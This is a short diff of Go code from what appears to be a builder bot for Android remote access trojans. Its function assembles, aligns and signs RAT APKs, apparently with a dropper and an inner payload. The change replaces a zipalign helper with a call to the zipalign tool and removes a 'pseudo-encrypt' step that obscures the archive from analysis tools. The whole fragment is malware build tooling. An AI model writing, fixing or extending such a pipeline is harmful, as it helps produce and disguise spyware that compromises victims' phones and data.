@@ -1885,15 +1885,12 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 
 
 	alignedAPK := filepath.Join(tmpDir, "aligned.apk")
-	if err := zipalign4(outputAPK, alignedAPK); err != nil {
-		return nil, "", fmt.Errorf("zipalign failed: %v", err)
+	alignCmd := exec.Command("zipalign", "-f", "4", outputAPK, alignedAPK)
+	if out, err := alignCmd.CombinedOutput(); err != nil {
+		return nil, "", fmt.Errorf("zipalign failed: %v: %s", err, out)
 	}
 	outputAPK = alignedAPK
 
-	
-	if err := pseudoEncryptZip(outputAPK); err != nil {
-		return nil, "", fmt.Errorf("pseudo-encrypt rat: %w", err)
-	}
 	if err := b.signWithEphemeralKey(outputAPK); err != nil {
 		return nil, "", fmt.Errorf("sign rat: %w", err)
 	}
